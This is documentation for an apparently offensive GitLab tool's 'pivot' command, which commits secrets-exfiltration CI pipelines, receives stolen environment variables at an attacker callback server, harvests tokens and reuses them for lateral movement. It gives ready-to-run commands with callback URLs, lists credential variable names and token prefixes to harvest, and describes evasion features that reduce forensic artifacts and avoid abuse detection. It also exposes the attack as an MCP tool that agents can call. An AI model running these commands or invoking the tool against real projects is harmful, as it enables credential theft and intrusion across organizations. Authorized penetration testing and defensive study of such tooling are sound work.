---
title: Pivot Command
description: Automated lateral movement via CI/CD secrets exfiltration and token harvesting
---

The pivot command automates the cycle of **enumerate → exploit → harvest → repeat**, turning a single GitLab token into a lateral movement engine. It discovers exploitable CI/CD vulnerabilities, exfiltrates secrets via HTTP callbacks, extracts new tokens, and uses them to discover additional scope.

> **Warning**: This is an offensive capability. Use only with explicit authorization during penetration tests or security assessments.

## How It Works

```
┌────────────────────────────────────────────────┐
│              gogatoz pivot                     │
│                                                │
│   1. Enumerate projects with current token     │
│   2. Filter for exploitable findings           │
│   3. Attack: commit secrets exfil pipeline     │
│   4. Receive exfiltrated env vars via callback │
│   5. Extract & validate new GitLab tokens      │
│   6. Repeat from step 1 with new tokens        │
└────────────────────────────────────────────────┘
```

The orchestrator uses **breadth-first traversal**: all targets at depth N are enumerated and attacked before depth N+1 begins. Each harvested token gets its own rate-limited GitLab API client.

## Prerequisites

- A GitLab PAT with at least `api` and `write_repository` scopes
- A VPS or server with a publicly reachable IP/domain (for receiving callbacks from CI runners)
- Network access between CI runners and your callback server

## Basic Usage

### Dry Run (Enumerate Only)

See what's exploitable without attacking:

```bash
gogatoz pivot -t org/project --dry-run
```

This enumerates the target, identifies exploitable findings, and reports what *would* be attacked. No branches are created, no pipelines are triggered.

### Full Pivot

```bash
gogatoz pivot \
  -t org/project1 -t org/project2 \
  --external-url https://my-vps:9443 \
  --max-depth 2
```

This will:
1. Start a callback server on `:9443`
2. Generate an RSA key pair (auto, per-session)
3. Enumerate the target projects
4. For each exploitable finding, commit a secrets exfiltration pipeline
5. Wait for CI runners to POST exfiltrated environment variables to `https://my-vps:9443`
6. Decrypt the payload (AES-256-CBC + RSA)
7. Extract any GitLab tokens from the environment
8. Validate new tokens against the GitLab API
9. Use valid tokens to repeat the process at the next depth level

## Flags

### Required

| Flag | Description |
|------|-------------|
| `-t, --target` | Project ID or path (repeatable) |
| `--external-url` | URL reachable from CI runners for callback (required unless `--dry-run`) |

### Limits & Control

| Flag | Default | Description |
|------|---------|-------------|
| `--max-depth` | 3 | Maximum pivot depth |
| `--max-targets` | 50 | Maximum total projects to attack |
| `--max-credentials` | 20 | Maximum credentials to harvest |
| `--timeout` | 30m | Overall timeout |
| `--concurrency` | 4 | Attack worker count |
| `--dry-run` | false | Enumerate only, show exploitable targets |
| `--cleanup` | false | Delete attack branches after harvest |

### Callback Server

| Flag | Default | Description |
|------|---------|-------------|
| `--listen` | `:9443` | Callback server listen address |
| `--rsa-key` | (auto-generate) | Path to existing RSA private key |

### Attack Options

| Flag | Default | Description |
|------|---------|-------------|
| `--branch` | `gogatoz-pivot` | Branch name base |
| `--group` | | Group IDs to expand |
| `--follow-includes` | false | Resolve CI include directives |
| `--fetch-runners` | false | Fetch runner info for severity |

## Output

### Text Mode (default)

Shows real-time progress with severity-colored events, followed by a summary table:

```
 Starting depth 0 with 1 credential(s)
 INFO  found 3 exploitable targets from 10 projects
 WARN  attacked org/vuln-project → https://gitlab.com/org/vuln-project/-/pipelines?ref=gogatoz-pivot
 SUCCESS  harvested pat token from DEPLOY_TOKEN (org/vuln-project)

┌──────────────────────┬───────┐
│ Metric               │ Value │
├──────────────────────┼───────┤
│ Projects Enumerated  │ 10    │
│ Exploitable Targets  │ 3     │
│ Projects Attacked    │ 3     │
│ Credentials Found    │ 2     │
│ Credentials Valid    │ 1     │
│ Max Depth Reached    │ 2     │
│ Duration             │ 4m12s │
└──────────────────────┴───────┘

Harvested Credentials
┌──────────────┬──────────────┬──────────┬───────┬───────┐
│ Type         │ Source Key   │ Username │ Depth │ Valid │
├──────────────┼──────────────┼──────────┼───────┼───────┤
│ pat          │ DEPLOY_TOKEN │ deploy   │ 1     │ yes   │
│ deploy_token │ GL_TOKEN     │          │ 1     │ no    │
└──────────────┴──────────────┴──────────┴───────┴───────┘
```

### JSON Mode

```bash
gogatoz pivot -t org/project --external-url https://vps:9443 --json
```

Returns a JSON object with stats and credential metadata (no raw token values):

```json
{
  "projects_enumerated": 10,
  "exploitable_targets": 3,
  "projects_attacked": 3,
  "credentials_found": 2,
  "credentials_valid": 1,
  "max_depth_reached": 2,
  "duration_ms": 252000
}
```

## Encryption

The pivot command uses end-to-end encryption for exfiltrated secrets:

1. An RSA-2048 key pair is generated per session (or loaded from `--rsa-key`)
2. The CI pipeline encrypts `secrets.json` with AES-256-CBC (PBKDF2 key derivation)
3. The AES passphrase is encrypted with the RSA public key (PKCS1v15)
4. Both ciphertext and encrypted key are base64-encoded and POSTed as JSON
5. The callback server decrypts in reverse order

This ensures secrets are encrypted in transit even if TLS is not available on the callback URL.

## Token Detection

The harvester scans exfiltrated environment variables for GitLab tokens using two strategies:

**By variable name:** `GITLAB_TOKEN`, `PRIVATE_TOKEN`, `CI_JOB_TOKEN`, `GL_TOKEN`, `DEPLOY_TOKEN`, `*_ACCESS_TOKEN`, `*_PAT`

**By value prefix:** `glpat-` (PAT), `gldt-` (deploy token), `glcbt-` (project access token), `glrt-` (runner token)

Short-lived JWTs (`CI_JOB_JWT*`) are automatically skipped as they expire before they can be useful for pivoting.

## Exploitable Findings

The pivot command attacks projects that have any of these finding types:

| Finding ID | Attack Method |
|-----------|--------------|
| `SELF_HOSTED_EXPOSED` | Secrets exfil via push CI |
| `MR_TAGGED_RUNNER` | Secrets exfil via push CI |
| `RUNNER_EXECUTOR_RISK` | Secrets exfil via push CI |
| `VARIABLE_INJECTION` | Secrets exfil via push CI |
| `PLAINTEXT_SECRET` | Secrets exfil via push CI |
| `FORK_MR_UNPROTECTED` | Secrets exfil via push CI |
| `ARTIFACT_POISONING_RISK` | Secrets exfil via push CI |
| `PRIVILEGED_RUNNER_RISK` | Secrets exfil via push CI |
| `PWN_REQUEST_DEPLOYMENT` | Secrets exfil via push CI |

All exploitable findings are attacked using secrets exfiltration with HTTP callback, regardless of the finding type. The goal is always token harvesting for lateral movement.

## Security Considerations

- **Raw tokens are never persisted to disk** — only SHA256 hashes are stored in the SQLite database
- **RSA keys are ephemeral** — generated per session and discarded unless `--rsa-key` is specified
- **Cleanup mode** (`--cleanup`) removes attack branches after harvesting to reduce forensic artifacts
- **Rate limiting** — each harvested token gets its own rate-limited API client to avoid triggering GitLab abuse detection

## Limitations

- **Protected variables** are only injected into pipelines running on protected branches. The pivot command creates branches that are typically not protected, so protected CI variables will not be exfiltrated.
- **Runner reachability** — the `--external-url` must be routable from the CI runner's network. Use tunneling (ngrok, Cloudflare Tunnel) if runners are in isolated networks.
- **Pipeline startup delay** — runners may be busy. The per-target receive timeout is 5 minutes.
- **CI_JOB_TOKEN** has limited scope and short lifetime, so it's identified but not used for further pivoting.

## MCP Tool

The pivot functionality is also available via MCP as `pivot_scan`:

```json
{
  "tool": "pivot_scan",
  "arguments": {
    "targets": ["org/project"],
    "external_url": "https://my-vps:9443",
    "dry_run": true,
    "max_depth": 2
  }
}
```

## Examples

### Targeting a group

```bash
gogatoz pivot --group 42 --external-url https://vps:9443 \
  --follow-includes --fetch-runners --max-depth 1
```

### Using an existing RSA key

```bash
openssl genrsa -out pivot.key 4096
gogatoz pivot -t org/project --external-url https://vps:9443 \
  --rsa-key pivot.key
```

### Scanning with cleanup

```bash
gogatoz pivot -t org/project --external-url https://vps:9443 \
  --cleanup --timeout 1h --max-targets 100
```
